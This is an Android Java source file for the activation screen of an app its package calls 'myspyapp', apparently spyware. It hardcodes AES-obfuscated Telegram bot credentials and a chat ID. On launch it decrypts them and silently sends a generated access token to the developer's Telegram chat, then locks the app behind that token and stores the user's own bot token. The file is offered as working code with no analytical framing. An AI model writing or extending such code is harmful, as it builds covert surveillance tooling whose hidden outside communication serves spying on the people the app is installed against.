package com.mycompany.myspyapp;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.os.StrictMode;
import android.util.Base64;
import android.view.Gravity;
import android.view.View;
import android.widget.*;
import java.io.*;
import java.net.*;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.json.*;

public class SetToken extends Activity {

    EditText botTokenInput, accessTokenInput;
    Button saveButton;
    String generatedAccessToken;
    

    final String FUCK_YOU = "UVRlvy6Cmm7JL8Y0FwHFm2iRhKAiE8uC3ieOM/V7zdMArt9C1qyKYLJhScyA2IBU";
    final String FUCK_YOU_TOO = "fuck56XMU8YoU68X";
    final String FUCKKK_U = "SCjKG/IT4iXbd4ayDh6seQ==";
    final String FUCK_YOU_2 = "fuck50XMU8YoU68X";
    
    
    private final String APP_ID = "spyapp1";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build());

        SharedPreferences prefs = getSharedPreferences("MyPrefs", MODE_PRIVATE);
        String bot = prefs.getString("botToken", null);
        String admin = prefs.getString("adminBotToken", null);
        String access = prefs.getString("accessToken", null);

        if (bot != null && admin != null && access != null) {
            startActivity(new Intent(this, MainActivity.class));
            finish();
            return;
        }

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER_HORIZONTAL);
        layout.setPadding(48, 48, 48, 48);
        layout.setBackgroundColor(Color.parseColor("#121212"));

        TextView title = new TextView(this);
        title.setText("Set Bot Tokens");
        title.setTextSize(20);
        title.setTextColor(Color.WHITE);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 30);
        layout.addView(title);

        GradientDrawable inputBackground = new GradientDrawable();
        inputBackground.setCornerRadius(20);
        inputBackground.setStroke(2, Color.GRAY);
        inputBackground.setColor(Color.parseColor("#1E1E1E"));

        botTokenInput = new EditText(this);
        botTokenInput.setHint("Enter User Bot Token");
        styleEditText(botTokenInput, inputBackground);
        layout.addView(botTokenInput);

        accessTokenInput = new EditText(this);
        accessTokenInput.setHint("Enter Access Token");
        styleEditText(accessTokenInput, inputBackground);
        layout.addView(accessTokenInput);

        saveButton = new Button(this);
        saveButton.setText("Save Tokens");
        saveButton.setTextColor(Color.BLACK);
        saveButton.setBackgroundColor(Color.parseColor("#03DAC5"));
        saveButton.setAllCaps(false);
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        btnParams.setMargins(0, 60, 0, 0);
        saveButton.setLayoutParams(btnParams);
        layout.addView(saveButton);

        setContentView(layout);

        try {
            String decryptedFuckToken = decAES(FUCK_YOU, FUCK_YOU_TOO);
            generatedAccessToken = generateRandomToken();
            
            String FuckId = decAES(FUCKKK_U, FUCK_YOU_2);
            sendAccessTokenToAdmin(decryptedFuckToken, FuckId, generatedAccessToken);
            
        } catch (Exception e) {
            Toast.makeText(this, "Failed to initialize admin communication", Toast.LENGTH_LONG).show();
        }

        saveButton.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    String botToken = botTokenInput.getText().toString().trim();
                    String enteredToken = accessTokenInput.getText().toString().trim();

                    if (!botToken.isEmpty() && !enteredToken.isEmpty()) {
                        if (enteredToken.equals(generatedAccessToken)) {
                            try {
                                String decryptedAdminToken = decAES(FUCK_YOU, FUCK_YOU_TOO);
                                SharedPreferences.Editor editor = getSharedPreferences("MyPrefs", MODE_PRIVATE).edit();
                                editor.putString("botToken", Base64.encodeToString(botToken.getBytes(), Base64.DEFAULT));
                                editor.putString("adminBotToken", Base64.encodeToString(decryptedAdminToken.getBytes(), Base64.DEFAULT));
                                editor.putString("accessToken", enteredToken);
                                editor.apply();

                                startActivity(new Intent(SetToken.this, MainActivity.class));
                                finish();
                            } catch (Exception e) {
                                Toast.makeText(SetToken.this, "Decryption error", Toast.LENGTH_SHORT).show();
                            }
                        } else {
                            accessTokenInput.setError("Invalid Access Token");
                        }
                    } else {
                        if (botToken.isEmpty()) botTokenInput.setError("Required");
                        if (enteredToken.isEmpty()) accessTokenInput.setError("Required");
                    }
                }
            });
    }

    private void styleEditText(EditText editText, GradientDrawable background) {
        editText.setBackground(background);
        editText.setTextColor(Color.WHITE);
        editText.setHintTextColor(Color.GRAY);
        editText.setPadding(30, 20, 30, 20);
        editText.setSingleLine(true);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 20, 0, 0);
        editText.setLayoutParams(params);
    }

    private String decAES(String encryptedBase64, String key) throws Exception {
        byte[] encryptedBytes = Base64.decode(encryptedBase64, Base64.DEFAULT);
        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        byte[] original = cipher.doFinal(encryptedBytes);
        return new String(original);
    }

    private String generateRandomToken() {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        SecureRandom rnd = new SecureRandom();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 20; i++) {
            sb.append(chars.charAt(rnd.nextInt(chars.length())));
        }
        return sb.toString();
    }

    /*private String getLatestChatId(String botToken) throws Exception {
        URL url = new URL("https://api.telegram.org/bot" + botToken + "/getUpdates");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder jsonBuilder = new StringBuilder();
        String line;
        while ((line = in.readLine()) != null) jsonBuilder.append(line);
        in.close();
        conn.disconnect();

        JSONObject response = new JSONObject(jsonBuilder.toString());
        JSONArray result = response.getJSONArray("result");
        if (result.length() == 0) throw new Exception("No updates found");
        JSONObject message = result.getJSONObject(result.length() - 1).getJSONObject("message");
        return message.getJSONObject("chat").getString("id");
    }*/
    
    

    private void sendAccessTokenToAdmin(String botToken, String chatId, String token) throws Exception {
        String msg = URLEncoder.encode("️🆔 App Id - " + APP_ID + "\n\n♻️ Access Token - " + token, "UTF-8");
        URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + msg);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.getInputStream().close();
        conn.disconnect();
    }
}

